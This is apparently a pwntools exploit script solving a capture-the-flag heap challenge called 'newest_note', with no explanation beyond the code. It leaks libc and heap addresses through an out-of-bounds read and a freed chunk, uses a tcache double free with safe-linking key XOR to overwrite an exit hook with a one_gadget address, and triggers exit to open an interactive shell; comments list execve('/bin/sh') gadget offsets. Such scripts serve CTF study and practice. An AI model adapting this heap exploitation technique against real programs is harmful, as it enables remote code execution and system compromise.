from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=process("./newest_note")
# io=remote("node4.anna.nssctf.cn",28331)
elf=ELF("./newest_note")
libc=ELF("./libc.so.6")

io.sendlineafter(b"will be? :",str(0x40040000))

def add(n,cc):
    io.sendlineafter(b": ",b"1")
    io.sendlineafter(b"Index: ",str(n))
    io.sendafter(b"Content: ",cc)

def delete(n):
    io.sendlineafter(b": ",b"2")
    io.sendlineafter(b"Index: ",str(n))

def show(n):
    io.sendlineafter(b": ",b"3")
    io.sendlineafter(b"Index: ",str(n))

gdb.attach(io)
pause()

show(539034)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x218cc0
print("leak_addr: ",hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b"__malloc_hook"]
free_hook=leak_addr+libc.sym[b"__free_hook"]
shell=leak_addr+0xeeccc
exit_hook=leak_addr+0x21a6c0


add(0,b"a")
delete(0)
show(0)
io.recvuntil(b"Content: ")
key=u64(io.recv(5).ljust(8,b"\x00"))
heap_addr=key<<12
print("heap_addr: ",hex(heap_addr))
print("key: "+hex(key))

for i in range(9):
    add(i,b"a")

add(9,b"a")

for i in range(7):
    delete(i)
    
delete(7)
delete(8)
delete(7)

for i in range(7):
    add(i,b"a")

add(7,p64(key^exit_hook))
add(8,b"a")
add(7,b"a")
add(10,p64(shell)*2)

io.sendlineafter(b": ",b"4")

io.interactive()


# 0xeeccc execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xeeccf execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xeecd2 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
